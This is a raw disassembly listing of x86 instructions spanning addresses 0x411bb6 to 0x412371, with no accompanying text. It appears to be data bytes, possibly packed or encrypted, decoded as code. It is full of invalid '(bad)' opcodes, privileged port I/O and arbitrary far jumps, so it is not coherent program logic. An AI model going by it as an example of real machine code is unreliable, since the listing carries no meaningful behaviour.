  411bb6:	mov    eax,0x4a50f2f5
  411bbb:	jmp    0x504449be
  411bc0:	xor    eax,0x7d347224
  411bc5:	cld    
  411bc6:	jg     0x411b68
  411bc8:	fisttp WORD PTR ds:0x5a6389b
  411bce:	xchg   ecx,eax
  411bcf:	or     cl,BYTE PTR [ecx+0x25]
  411bd2:	push   ebx
  411bd3:	xchg   ebx,eax
  411bd4:	dec    eax
  411bd5:	jb     0x411bf5
  411bd7:	fldenv [edi]
  411bd9:	xchg   edx,eax
  411bda:	sub    BYTE PTR [ecx],ch
  411bdc:	jl     0x411c15
  411bde:	mov    ds:0x4f2b3572,al
  411be3:	cld    
  411be4:	push   edx
  411be5:	mov    ch,0xfb
  411be7:	outs   dx,BYTE PTR ds:[esi]
  411be8:	sub    eax,0x3961f489
  411bed:	outs   dx,DWORD PTR ds:[esi]
  411bee:	xchg   esp,eax
  411bef:	test   BYTE PTR [eax+eiz*8-0x5d],dh
  411bf3:	retf   0xba4e
  411bf6:	mov    BYTE PTR [ebp+ebx*2+0x54719f8c],al
  411bfd:	pusha  
  411bfe:	es loop 0x411bd7
  411c01:	scas   al,BYTE PTR es:[edi]
  411c02:	(bad)  
  411c03:	in     al,0x9b
  411c05:	jns    0x411c06
  411c07:	and    ecx,DWORD PTR [ebp-0x3aa87ba0]
  411c0d:	cli    
  411c0e:	add    edx,DWORD PTR [ecx]
  411c10:	dec    esp
  411c11:	inc    edx
  411c12:	repz pop eax
  411c14:	pop    edx
  411c15:	xchg   ebx,eax
  411c16:	loopne 0x411c94
  411c18:	cmp    ch,BYTE PTR [edi]
  411c1a:	popa   
  411c1b:	add    BYTE PTR ds:0x2be2a5e2,cl
  411c21:	or     ah,BYTE PTR [edx]
  411c23:	xchg   ebx,eax
  411c24:	cmc    
  411c25:	jb     0x411c92
  411c27:	ret    
  411c28:	mov    bl,0x3d
  411c2a:	push   eax
  411c2b:	inc    ebp
  411c2c:	push   ebx
  411c2d:	push   0xd36952c6
  411c32:	icebp  
  411c33:	and    eax,0xaf627dc5
  411c38:	out    dx,eax
  411c39:	fstp   TBYTE PTR [edi]
  411c3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c3c:	adc    ecx,DWORD PTR [ebx-0x3f845f1]
  411c42:	pop    edx
  411c43:	repz xchg eax,edi
  411c46:	(bad)  
  411c47:	jbe    0x411c31
  411c49:	jmp    DWORD PTR [edx]
  411c4b:	lods   eax,DWORD PTR cs:[esi]
  411c4d:	mov    dh,0x96
  411c4f:	add    edi,DWORD PTR [ebp-0x5a17f5ee]
  411c55:	fisttp QWORD PTR [ebp-0x45]
  411c58:	cli    
  411c59:	test   DWORD PTR [eax+0x44],ecx
  411c5c:	dec    ebp
  411c5d:	das    
  411c5e:	outs   dx,DWORD PTR ds:[esi]
  411c5f:	lods   al,BYTE PTR ds:[esi]
  411c60:	jo     0x411bee
  411c62:	loope  0x411c9d
  411c64:	in     al,dx
  411c65:	xchg   BYTE PTR [ebp+edi*8-0x43185f1],dh
  411c6c:	adc    BYTE PTR [edx-0x52fc6713],0x1e
  411c73:	jge    0x411cb2
  411c75:	mov    ds:0x2d69b535,al
  411c7a:	xor    al,0x2
  411c7c:	push   edi
  411c7d:	jnp    0x411c2d
  411c7f:	jnp    0x411cd6
  411c81:	jae    0x411c8a
  411c83:	xchg   esi,eax
  411c84:	cmp    edi,ebp
  411c86:	lds    esi,FWORD PTR [edi]
  411c88:	and    DWORD PTR ds:0x161bb20c,eax
  411c8e:	out    dx,eax
  411c8f:	inc    esi
  411c90:	imul   eax,DWORD PTR [ecx-0x40396c60],0xad19df4a
  411c9a:	daa    
  411c9b:	retf   0x8b57
  411c9e:	xor    esp,DWORD PTR ds:0x62db4f2
  411ca4:	mov    DWORD PTR [edx],eax
  411ca6:	push   ss
  411ca7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ca8:	xchg   edi,eax
  411ca9:	loopne 0x411c4d
  411cab:	sub    DWORD PTR [edx],0x3e
  411cae:	cld    
  411caf:	and    BYTE PTR [eax+ecx*4+0x2f],ah
  411cb3:	add    DWORD PTR [ebx],ebx
  411cb5:	pusha  
  411cb6:	leave  
  411cb7:	sahf   
  411cb8:	mov    al,0x22
  411cba:	in     al,0xf1
  411cbc:	add    edx,eax
  411cbe:	repz pop eax
  411cc0:	xchg   esp,eax
  411cc1:	pop    es
  411cc2:	aam    0x90
  411cc4:	pusha  
  411cc5:	xor    BYTE PTR [ebp+ebp*4+0x1c2bb34e],0x54
  411ccd:	clc    
  411cce:	jo     0x411cbe
  411cd0:	pop    esi
  411cd1:	jno    0x411cae
  411cd3:	mul    BYTE PTR [esi]
  411cd5:	mov    eax,ds:0xa213cbc
  411cda:	jle    0x411ced
  411cdc:	dec    esi
  411cdd:	aad    0x62
  411cdf:	addr16 xchg ebx,eax
  411ce1:	cmp    al,0x72
  411ce3:	adc    ebp,ebx
  411ce5:	fstp   TBYTE PTR [ebx+0x31]
  411ce8:	jmp    0x411cd8
  411cea:	fwait
  411ceb:	push   edx
  411cec:	(bad)  
  411ced:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411cee:	sbb    BYTE PTR [ecx+eax*4-0x18],cl
  411cf2:	es retf 0x5d75
  411cf6:	mov    eax,ds:0x9e3bc12c
  411cfb:	rcr    BYTE PTR [edi-0x467133cb],1
  411d01:	pop    ss
  411d02:	enter  0x367f,0xc1
  411d06:	enter  0xc73d,0x62
  411d0a:	or     ch,BYTE PTR [ecx-0x41]
  411d0d:	mov    al,0x17
  411d0f:	(bad)  
  411d11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d12:	xchg   ecx,eax
  411d13:	xor    DWORD PTR [ebp-0x44a321c1],ebp
  411d19:	sub    esp,eax
  411d1b:	lods   al,BYTE PTR ds:[esi]
  411d1c:	push   ebx
  411d1d:	mov    ebp,0x5389a3bc
  411d22:	data16 out 0xd0,al
  411d25:	aad    0x79
  411d27:	pop    eax
  411d28:	int3   
  411d29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d2a:	mov    dh,0x4f
  411d2c:	bound  ebp,QWORD PTR [edx+0x50]
  411d2f:	mov    esp,0x45cf24fb
  411d34:	loope  0x411cc7
  411d36:	lods   eax,DWORD PTR ds:[esi]
  411d37:	fisubr WORD PTR [ebx+0x12]
  411d3a:	fnstenv [ebx]
  411d3c:	dec    esp
  411d3d:	(bad)  
  411d3e:	fcmovnu st,st(0)
  411d40:	test   DWORD PTR [esi],0x75076adf
  411d46:	push   ds
  411d47:	push   ss
  411d48:	push   0x76
  411d4a:	or     eax,0x5d155f7d
  411d4f:	mov    eax,0x2585bb02
  411d54:	std    
  411d55:	ss push cs
  411d57:	xchg   ebx,eax
  411d58:	push   ss
  411d59:	inc    eax
  411d5a:	mov    ebp,0x92065ebc
  411d5f:	xchg   esi,eax
  411d60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d61:	mov    ecx,0x4fc30259
  411d66:	retf   0xf55b
  411d69:	inc    edx
  411d6a:	and    esp,DWORD PTR [ecx+0x7b]
  411d6d:	jmp    0x411d26
  411d6f:	ret    
  411d70:	not    WORD PTR [ecx+0xd583744]
  411d77:	dec    esi
  411d78:	sti    
  411d79:	retf   0x8ce9
  411d7c:	sub    al,0x1e
  411d7e:	sbb    DWORD PTR [ecx+0x36],ebx
  411d81:	mov    eax,0x28dc6f60
  411d86:	dec    ebp
  411d87:	icebp  
  411d88:	pop    ss
  411d89:	add    BYTE PTR [esi-0x4b937535],dh
  411d8f:	xor    eax,0x40ab1fb0
  411d94:	mov    esp,0x989bd634
  411d99:	jo     0x411d9a
  411d9b:	les    edi,FWORD PTR [ecx+0x64c34098]
  411da1:	dec    edi
  411da2:	xlat   BYTE PTR ds:[ebx]
  411da3:	in     eax,dx
  411da4:	iret   
  411da5:	xchg   edi,eax
  411da6:	aad    0x6d
  411da8:	push   0x34db6bb4
  411dad:	or     dl,BYTE PTR [edi]
  411daf:	adc    al,dh
  411db1:	pusha  
  411db2:	fldcw  WORD PTR [ecx-0xbccaa97]
  411db8:	fs inc esp
  411dba:	pop    ecx
  411dbb:	cmp    DWORD PTR [edi+0x52],eax
  411dbe:	push   edi
  411dbf:	xor    eax,0x6b17f59c
  411dc4:	gs inc esi
  411dc6:	add    eax,0x9a54f917
  411dcb:	xor    DWORD PTR [edx+0x4d],eax
  411dce:	cmp    eax,0xee90d9b8
  411dd3:	neg    DWORD PTR [esi+0x6f]
  411dd6:	fbld   TBYTE PTR [esi-0x45]
  411dd9:	mov    edx,0x9844ffda
  411dde:	xchg   edi,eax
  411ddf:	push   0xb9528e55
  411de4:	rol    DWORD PTR [ebx],cl
  411de6:	out    dx,al
  411de7:	sub    DWORD PTR [edx],eax
  411de9:	dec    ebp
  411dea:	mov    ecx,0x26f1d75c
  411def:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411df0:	mov    esi,0x3ecb8bdc
  411df5:	js     0x411e39
  411df7:	push   esi
  411df8:	inc    esp
  411df9:	xor    DWORD PTR [ecx],ebp
  411dfb:	xchg   esp,eax
  411dfc:	cdq    
  411dfd:	rcl    DWORD PTR [ecx],0x87
  411e00:	das    
  411e01:	stc    
  411e02:	jne    0x411e36
  411e04:	or     ebp,DWORD PTR fs:[ecx+0x5a8ca33b]
  411e0b:	addr16 cdq 
  411e0d:	push   ebp
  411e0e:	mov    esp,0xcefbbef6
  411e13:	jae    0x411e52
  411e15:	add    edi,ebx
  411e17:	push   esi
  411e18:	xlat   BYTE PTR ds:[ebx]
  411e19:	or     DWORD PTR [esi+0x530f27aa],ecx
  411e1f:	push   cs
  411e20:	(bad)  
  411e22:	push   esp
  411e23:	xchg   edx,ecx
  411e25:	dec    esi
  411e26:	fstp   st(3)
  411e29:	xchg   ebx,eax
  411e2a:	int    0x6
  411e2c:	fucomip st,st(7)
  411e2e:	pushf  
  411e2f:	(bad)
  411e33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e34:	fdivr  st(4),st
  411e36:	lods   eax,DWORD PTR ds:[esi]
  411e37:	mov    ebp,0xc2d6d72
  411e3c:	dec    eax
  411e3d:	mov    edi,0x749e9b6a
  411e42:	aas    
  411e43:	in     eax,0xca
  411e45:	and    ch,bh
  411e47:	inc    esi
  411e48:	stos   DWORD PTR es:[edi],eax
  411e49:	jno    0x411eca
  411e4b:	add    cl,ch
  411e4d:	(bad)  
  411e4f:	mov    cl,0x45
  411e51:	cmp    eax,0x5794f3e
  411e56:	dec    edx
  411e57:	push   esp
  411e58:	sahf   
  411e59:	adc    DWORD PTR ds:0xaf69da9a,0x9128790f
  411e63:	jo     0x411e07
  411e65:	pop    ebx
  411e66:	mov    eax,ds:0x541d6eef
  411e6b:	xor    DWORD PTR [esi],esi
  411e6d:	push   0xffffffac
  411e6f:	jno    0x411e98
  411e71:	out    0x33,al
  411e73:	iret   
  411e74:	test   al,0x38
  411e76:	push   ebx
  411e77:	(bad)  
  411e78:	imul   esi
  411e7a:	cmc    
  411e7b:	jae    0x411ed6
  411e7d:	xor    al,BYTE PTR [esp+edx*8+0x497d4efa]
  411e84:	hlt    
  411e85:	lock out 0x73,al
  411e88:	inc    edi
  411e89:	shl    DWORD PTR [edx],1
  411e8b:	mov    bh,0x68
  411e8d:	jne    0x411eaf
  411e8f:	rol    BYTE PTR [ebx],0xdc
  411e92:	inc    esi
  411e93:	dec    ecx
  411e94:	add    dl,bh
  411e96:	mov    bh,0xb6
  411e98:	xchg   BYTE PTR [edi-0x47],dh
  411e9b:	lea    esi,[edi+0x32]
  411e9e:	icebp  
  411e9f:	outs   dx,DWORD PTR ds:[esi]
  411ea0:	in     al,0xf6
  411ea2:	pop    edx
  411ea3:	test   BYTE PTR [edx],al
  411ea5:	push   esp
  411ea6:	ret    0x91fd
  411ea9:	add    BYTE PTR [ebx-0x1d],bh
  411eac:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  411eae:	sub    esi,DWORD PTR [esi]
  411eb0:	and    BYTE PTR [edi],bl
  411eb2:	div    BYTE PTR [edi+0x2fa05ad]
  411eb8:	fcmovbe st,st(0)
  411eba:	jns    0x411e70
  411ebc:	pop    ss
  411ebd:	cmp    al,0xe8
  411ebf:	and    eax,0x4dd61165
  411ec4:	ds sbb dh,bl
  411ec7:	retf   0x579b
  411eca:	mov    ds,WORD PTR [ecx-0x78df375a]
  411ed0:	stos   BYTE PTR es:[edi],al
  411ed1:	xchg   edx,eax
  411ed2:	or     al,0x16
  411ed4:	ret    0x61b2
  411ed7:	add    dh,ah
  411ed9:	fs jae 0x411f30
  411edc:	mov    bl,0x90
  411ede:	repz icebp 
  411ee0:	inc    esp
  411ee1:	out    dx,eax
  411ee2:	add    DWORD PTR [ebp+0x21],ebp
  411ee5:	mov    al,BYTE PTR [edx-0x8b56e46]
  411eeb:	test   eax,0x66b73f2a
  411ef0:	into   
  411ef1:	adc    eax,0xf1162eca
  411ef6:	push   cs
  411ef7:	sbb    eax,edx
  411ef9:	mov    ds:0x18faf0b2,eax
  411efe:	dec    esp
  411eff:	jnp    0x411ef9
  411f01:	rcl    ebx,cl
  411f03:	leave  
  411f04:	adc    dl,BYTE PTR [ebx]
  411f06:	push   0x9d4678ed
  411f0b:	fidiv  DWORD PTR [ebx+0x1e]
  411f0e:	inc    ebp
  411f0f:	mov    eax,ds:0x91c1e611
  411f14:	in     eax,dx
  411f15:	dec    ecx
  411f16:	adc    eax,0x7d327eed
  411f1b:	xchg   ecx,eax
  411f1c:	xchg   edi,eax
  411f1d:	xchg   esi,eax
  411f1e:	popf   
  411f1f:	aaa    
  411f20:	stc    
  411f21:	push   ebp
  411f22:	xor    dl,BYTE PTR [ecx+eiz*1-0x4c]
  411f26:	push   es
  411f27:	(bad)  
  411f28:	stc    
  411f29:	or     al,0xe0
  411f2b:	mov    eax,0xb34b1787
  411f30:	test   al,0x6b
  411f32:	jmp    0xb718:0xeb252c1
  411f39:	mov    edi,0x2e673d8a
  411f3e:	adc    DWORD PTR [edi+ebx*4-0x1c6c5b74],esi
  411f45:	pop    ebx
  411f46:	mov    bh,0x58
  411f48:	mov    ch,ch
  411f4a:	fs call 0xa869:0x2a720b9c
  411f52:	(bad)
  411f55:	or     al,0x8c
  411f57:	add    DWORD PTR [ecx+0x4b],ebp
  411f5a:	inc    ecx
  411f5b:	retf   
  411f5c:	adc    bl,cl
  411f5e:	and    al,0xf
  411f60:	sbb    BYTE PTR [esi+0x3a],dl
  411f63:	or     eax,0xdbf16128
  411f68:	(bad)  
  411f69:	push   ds
  411f6a:	xor    eax,0xd4b0e48c
  411f6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f70:	jmp    0x411fc6
  411f72:	ja     0x411fd6
  411f74:	(bad)  
  411f75:	pop    ecx
  411f76:	addr16 ss gs dec ebp
  411f7a:	into   
  411f7b:	out    0x72,eax
  411f7d:	cmp    DWORD PTR [edi+0x62],ecx
  411f80:	push   edx
  411f81:	stc    
  411f82:	xor    edi,DWORD PTR fs:[ebx-0x47]
  411f86:	xchg   ecx,eax
  411f87:	sahf   
  411f88:	sbb    al,0xdc
  411f8a:	mov    WORD PTR [ebx-0x5b8abe2c],ds
  411f90:	call   0xb877:0xa5d5f21e
  411f97:	call   0xc011:0xef8cf00f
  411f9e:	push   esi
  411f9f:	lahf   
  411fa0:	or     eax,0x905082c6
  411fa5:	dec    esp
  411fa6:	loope  0x41201c
  411fa8:	rcl    edi,0xf8
  411fab:	dec    ecx
  411fac:	arpl   WORD PTR [edi],cx
  411fae:	push   edx
  411faf:	sub    eax,0xe619adc3
  411fb4:	jge    0x411fb5
  411fb6:	int3   
  411fb7:	push   es
  411fb8:	push   edx
  411fb9:	or     DWORD PTR [eax+eiz*1-0x1eee9798],0x30
  411fc1:	add    esi,DWORD PTR [ecx-0x69]
  411fc4:	dec    edx
  411fc5:	or     DWORD PTR [ebp-0x25e2556a],esi
  411fcb:	iret   
  411fcc:	into   
  411fcd:	adc    edi,DWORD PTR [ecx-0x784cad5]
  411fd3:	jge    0x412048
  411fd5:	cmc    
  411fd6:	pop    ebp
  411fd7:	rcr    BYTE PTR [ebx+ebx*8],1
  411fda:	sub    al,0x95
  411fdc:	int3   
  411fdd:	int3   
  411fde:	popa   
  411fdf:	frstor [edx-0x4]
  411fe2:	push   es
  411fe3:	sub    eax,0xbfac0c7
  411fe8:	mov    bl,0x67
  411fea:	ret    0xd7ea
  411fed:	(bad)  
  411fee:	out    0x3d,eax
  411ff0:	mov    esi,0xfb5c92d9
  411ff5:	mov    ebx,ebx
  411ff7:	outs   dx,BYTE PTR ds:[esi]
  411ff8:	fwait
  411ff9:	lods   al,BYTE PTR ds:[esi]
  411ffa:	mul    eax
  411ffc:	pop    eax
  411ffd:	cmp    BYTE PTR [ecx],bh
  411fff:	sub    BYTE PTR [edi-0x6d2a6eb3],cl
  412005:	inc    ecx
  412006:	pop    eax
  412007:	imul   esi,DWORD PTR [esi+0x48],0x3d
  41200b:	sub    dh,BYTE PTR [edx+0x34]
  41200e:	loope  0x412066
  412010:	aad    0xd4
  412012:	ins    BYTE PTR es:[edi],dx
  412013:	pop    ebp
  412014:	jb     0x412012
  412016:	dec    dl
  412018:	pushf  
  412019:	pop    edx
  41201a:	or     DWORD PTR [edi],ebx
  41201c:	stc    
  41201d:	jg     0x412055
  41201f:	mov    ds:0x6e13f6f0,eax
  412024:	inc    ebp
  412025:	or     BYTE PTR [esp+esi*2],ch
  412028:	xor    BYTE PTR [eax+esi*2],ah
  41202b:	or     eax,0xbed006b7
  412030:	into   
  412031:	cmp    eax,ecx
  412033:	cs out dx,eax
  412035:	pop    edx
  412036:	mov    DWORD PTR [ebp+eax*1-0x3fde6754],esp
  41203d:	data16 icebp 
  41203f:	add    edi,DWORD PTR [ebx+0x17]
  412042:	xchg   ecx,eax
  412043:	cdq    
  412044:	jl     0x412024
  412046:	in     al,dx
  412047:	gs xchg ebx,eax
  412049:	inc    ebp
  41204a:	in     eax,0x65
  41204c:	and    esi,DWORD PTR [edx+0x3]
  41204f:	out    0xc9,al
  412051:	xchg   ecx,eax
  412052:	nop
  412053:	mov    ds:0x22365fa9,eax
  412058:	jo     0x412019
  41205a:	fs loopne 0x412095
  41205d:	mov    eax,ds:0x46a53dc6
  412062:	adc    eax,0x7422a64d
  412067:	push   edi
  412068:	rcl    BYTE PTR [edx-0x6c50cf60],1
  41206e:	pop    ebx
  41206f:	cmp    ecx,ebx
  412071:	test   BYTE PTR [eax+0x12b03de7],bl
  412077:	xor    DWORD PTR [ecx-0x41],0x74
  41207b:	jmp    0xc010:0x43ac0a39
  412082:	rcr    dh,cl
  412084:	fs lahf 
  412086:	adc    al,0xa9
  412088:	mov    bl,0xb0
  41208a:	rcl    DWORD PTR [esi+0x5daf518d],1
  412090:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412091:	je     0x4120d4
  412093:	sub    BYTE PTR [ecx+0x750951e7],cl
  412099:	xor    bh,BYTE PTR [eax]
  41209b:	push   edi
  41209c:	test   DWORD PTR [edx+0x279e1cf1],edi
  4120a2:	test   DWORD PTR [eax+esi*1],edi
  4120a5:	adc    bh,al
  4120a7:	imul   DWORD PTR [eax]
  4120a9:	push   DWORD PTR [edx+eiz*8-0x51a6ef9f]
  4120b0:	xor    eax,0xf8187961
  4120b5:	mov    ebx,0x47a189d4
  4120ba:	ss xor eax,0x5e87a230
  4120c0:	inc    eax
  4120c1:	cmp    edx,DWORD PTR [ecx+0x51a906cd]
  4120c7:	scas   al,BYTE PTR es:[edi]
  4120c8:	sahf   
  4120c9:	outs   dx,BYTE PTR ds:[esi]
  4120ca:	(bad)  
  4120cb:	gs imul edi,eax,0xde8bc604
  4120d2:	stos   DWORD PTR es:[edi],eax
  4120d3:	scas   al,BYTE PTR es:[edi]
  4120d4:	(bad)  
  4120d6:	fs push eax
  4120d8:	pusha  
  4120d9:	mov    dh,0xd
  4120db:	xor    bh,BYTE PTR [edi+0x31]
  4120de:	mov    ds:0x90aed1b2,al
  4120e3:	add    DWORD PTR [ebp-0x49],0x3a
  4120e7:	push   ss
  4120e8:	adc    eax,0x59642d35
  4120ed:	into   
  4120ee:	adc    edi,DWORD PTR [ecx]
  4120f0:	sub    ebx,eax
  4120f2:	fld    QWORD PTR [edx]
  4120f4:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4120f6:	adc    eax,0x2cbb09b1
  4120fb:	xchg   BYTE PTR [ebx],cl
  4120fd:	call   esp
  4120ff:	aaa    
  412100:	push   cs
  412101:	push   0xffffff84
  412103:	jnp    0x4120d2
  412105:	dec    ebp
  412106:	ret    
  412107:	inc    edi
  412108:	or     bh,BYTE PTR [edi+0x71ab5889]
  41210e:	test   eax,0xa3b1e2f9
  412113:	adc    BYTE PTR [ecx-0x672a2403],ch
  412119:	in     al,0x4c
  41211b:	sub    ebp,0x4d
  41211e:	loope  0x41210c
  412120:	out    0xc8,al
  412122:	jmp    0x412156
  412124:	mov    DWORD PTR [eax+0x5e],eax
  412127:	add    ch,ah
  412129:	cwde   
  41212a:	out    0x6e,eax
  41212c:	cmp    ebp,DWORD PTR [esp+edx*8]
  41212f:	lds    ebx,FWORD PTR [eax+0x70]
  412132:	les    ebx,FWORD PTR [eax]
  412134:	es hlt 
  412136:	pop    ebx
  412137:	push   esp
  412138:	xchg   ecx,eax
  412139:	imul   ecx,DWORD PTR [edx],0x59
  41213c:	fwait
  41213d:	call   0xba1cd20
  412142:	test   eax,0xf85afacb
  412147:	je     0x4120fe
  412149:	push   edx
  41214a:	mov    ds:0xe03c1566,eax
  41214f:	add    al,0xb4
  412151:	sti    
  412152:	dec    ebx
  412153:	inc    ebp
  412154:	mov    ds:0xd297c41c,eax
  412159:	xchg   DWORD PTR [esi],edi
  41215b:	dec    ecx
  41215c:	cmc    
  41215d:	cmp    cl,BYTE PTR [edx]
  41215f:	mov    ch,0xf1
  412161:	call   0x968c:0xbb05ddf6
  412168:	add    eax,DWORD PTR [edi+0x50]
  41216b:	les    esi,FWORD PTR [ebx+0x40cc4eb0]
  412171:	xchg   ebx,eax
  412172:	push   es
  412173:	data16 xchg BYTE PTR [eax+0x10],al
  412177:	inc    eax
  412178:	push   cs
  412179:	adc    eax,0x7d7b629c
  41217e:	fistp  QWORD PTR gs:[ecx+0x3e]
  412182:	adc    al,0x1
  412184:	jb     0x412172
  412186:	test   eax,0xa168744d
  41218b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41218c:	xchg   bx,ax
  41218e:	dec    edx
  41218f:	jb     0x412119
  412191:	sub    eax,0x9907b28b
  412196:	cli    
  412197:	idiv   DWORD PTR [ebx]
  412199:	fwait
  41219a:	pop    edx
  41219b:	sub    DWORD PTR [esi],0xa
  41219e:	mov    ecx,0xcc28fbef
  4121a3:	mov    edi,0xa9621fe3
  4121a8:	inc    edi
  4121a9:	loopne 0x41220d
  4121ab:	int    0xc6
  4121ad:	xor    ebx,edx
  4121af:	lea    edi,[edi-0x1d]
  4121b2:	jge    0x41219c
  4121b4:	mov    eax,ds:0x3cae634b
  4121b9:	and    DWORD PTR [edx+0x14],esp
  4121bc:	das    
  4121bd:	sbb    edi,edx
  4121bf:	jne    0x4121f6
  4121c1:	add    dh,ch
  4121c3:	mov    ecx,0x956c987
  4121c8:	sub    eax,0x7c8d2529
  4121cd:	pop    ebx
  4121ce:	mov    edi,0x67651ac
  4121d3:	fcomp  DWORD PTR [edx]
  4121d5:	into   
  4121d6:	mov    edi,0x8f213173
  4121db:	mov    bl,0x94
  4121dd:	imul   edi,DWORD PTR [eax+edx*2+0x4cb8bf21],0x5dea258a
  4121e8:	push   0xe6fda986
  4121ed:	lods   eax,DWORD PTR ds:[esi]
  4121ee:	into   
  4121ef:	inc    ebx
  4121f0:	ror    ah,1
  4121f2:	mov    ah,0xa8
  4121f4:	das    
  4121f5:	(bad)  
  4121f6:	dec    esi
  4121f7:	pop    ds
  4121f8:	imul   ecx,DWORD PTR [ecx+ebx*2+0x66],0xffffffa0
  4121fd:	push   ss
  4121fe:	mov    bl,0x70
  412200:	stos   BYTE PTR es:[edi],al
  412201:	jg     0x4121da
  412203:	push   ebp
  412204:	xor    al,0x3e
  412206:	nop
  412207:	ins    DWORD PTR es:[edi],dx
  412208:	mov    eax,0x15188d9f
  41220d:	(bad)  
  41220e:	leave  
  41220f:	popa   
  412210:	out    dx,al
  412211:	sub    al,0xa
  412213:	mov    ch,BYTE PTR [eax-0x8]
  412216:	add    al,0xd9
  412218:	jecxz  0x4121fc
  41221a:	into   
  41221b:	xchg   edi,eax
  41221c:	add    eax,0xdf780d3c
  412221:	xchg   BYTE PTR [ecx+0x6079ed34],bl
  412227:	mov    cl,bl
  412229:	push   edx
  41222a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41222b:	loope  0x41225e
  41222d:	xchg   ebx,eax
  41222e:	nop
  41222f:	jg     0x412202
  412231:	jmp    0xb0d7:0xbffb1374
  412238:	jno    0x412258
  41223a:	xchg   ebx,eax
  41223b:	mov    esi,0x40d76682
  412240:	mov    esi,0x38d35d1a
  412245:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412246:	std    
  412247:	sub    BYTE PTR [esi+0x411f8abe],al
  41224d:	lock jmp 0xcf0d:0x8c2a4ecd
  412255:	hlt    
  412256:	scas   al,BYTE PTR es:[edi]
  412257:	jae    0x41225f
  412259:	sub    BYTE PTR [ebx+0x1eaf8b27],ah
  41225f:	retf   
  412260:	daa    
  412261:	clc    
  412262:	fidivr WORD PTR [ebx]
  412264:	fimul  DWORD PTR [eax-0xd]
  412267:	push   cs
  412268:	(bad)  
  412269:	adc    eax,0x9dec56c7
  41226e:	mov    esi,0xddc4a16e
  412273:	xchg   ebp,eax
  412274:	je     0x4122af
  412276:	aam    0xbb
  412278:	push   ebp
  412279:	push   cs
  41227a:	mov    cl,0x86
  41227c:	xor    esp,DWORD PTR [ecx+0x374188ad]
  412282:	xor    al,0x4c
  412284:	outs   dx,DWORD PTR ds:[esi]
  412285:	ss dec esp
  412287:	in     al,0x6e
  412289:	addr16 clc 
  41228b:	mov    ecx,0xc26c019f
  412290:	pop    ss
  412291:	test   DWORD PTR [ebx-0xf],edi
  412294:	jno    0x4122c9
  412296:	jle    0x412220
  412298:	fdiv   DWORD PTR [ebp+0x7d]
  41229b:	adc    al,0xca
  41229d:	call   0x6440:0x648855bc
  4122a4:	sbb    ecx,esi
  4122a6:	mov    ebp,0xc088b481
  4122ab:	inc    eax
  4122ac:	xchg   edx,eax
  4122ad:	add    edi,edx
  4122af:	pmulhuw mm6,QWORD PTR [ebx+0x4c21c532]
  4122b6:	mov    dl,0xce
  4122b8:	inc    edx
  4122b9:	loop   0x412309
  4122bb:	aaa    
  4122bc:	cmc    
  4122bd:	scas   al,BYTE PTR es:[edi]
  4122be:	int3   
  4122bf:	xchg   edx,eax
  4122c0:	pop    esi
  4122c1:	pusha  
  4122c2:	popa   
  4122c3:	inc    ebx
  4122c4:	je     0x412276
  4122c6:	fwait
  4122c7:	aaa    
  4122c8:	mov    bl,0x80
  4122ca:	int    0x43
  4122cc:	push   edx
  4122cd:	pop    ebp
  4122ce:	cmp    esi,esi
  4122d0:	icebp  
  4122d1:	pop    ds
  4122d2:	inc    ebx
  4122d3:	or     DWORD PTR [esi],esp
  4122d5:	popf   
  4122d6:	inc    ebx
  4122d7:	mov    esp,0xc97da56b
  4122dc:	arpl   WORD PTR [edi+0x6],ax
  4122df:	popf   
  4122e0:	push   edi
  4122e1:	and    ch,dl
  4122e3:	ret    0xf022
  4122e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4122e7:	xor    eax,esi
  4122e9:	or     al,0xef
  4122eb:	dec    esp
  4122ec:	iret   
  4122ed:	fwait
  4122ee:	cmp    eax,0xbd1e2218
  4122f3:	mov    ah,0xc
  4122f5:	loopne 0x4122be
  4122f7:	out    dx,al
  4122f8:	ret    0xf143
  4122fb:	adc    DWORD PTR [ecx-0x1231436a],ecx
  412301:	sbb    edx,DWORD PTR [ebx+0x46]
  412304:	dec    edx
  412305:	sahf   
  412306:	push   0xfffffff5
  412308:	mov    dh,0xa
  41230a:	sbb    BYTE PTR [ecx-0x157f8ad9],ch
  412310:	adc    esi,esp
  412312:	xor    BYTE PTR [esi+0x324a9778],ah
  412318:	sbb    ah,BYTE PTR [esi+0x35]
  41231b:	lds    esi,FWORD PTR [ebx+0xf]
  41231e:	push   0x1c682cfe
  412323:	gs lahf 
  412325:	and    esi,esi
  412327:	inc    ebp
  412328:	cwde   
  412329:	push   ss
  41232a:	mov    edi,0x26a6f57
  41232f:	push   es
  412330:	shr    BYTE PTR [esi],0xc
  412333:	dec    esp
  412334:	clc    
  412335:	add    eax,0xcce94399
  41233a:	ins    DWORD PTR es:[edi],dx
  41233b:	sbb    DWORD PTR [ebp-0x4],0xdecede37
  412342:	imul   esi,DWORD PTR [ebx-0x44],0xc04d9c52
  412349:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41234a:	and    DWORD PTR [esi-0x362c1137],0x5b351551
  412354:	dec    eax
  412355:	push   0x3cfdfc6b
  41235a:	iret   
  41235b:	mov    ch,0x35
  41235d:	inc    ebp
  41235f:	pop    ebp
  412360:	mov    dl,0x6d
  412362:	xchg   esi,eax
  412363:	aad    0x3a
  412365:	jp     0x412345
  412367:	mov    dl,0xcf
  412369:	cdq    
  41236a:	pop    edi
  41236b:	lods   eax,DWORD PTR ds:[esi]
  41236c:	mov    BYTE PTR [eax],ah
  41236e:	ins    BYTE PTR es:[edi],dx
  41236f:	inc    esp
  412370:	inc    edi
  412371:	cmc    
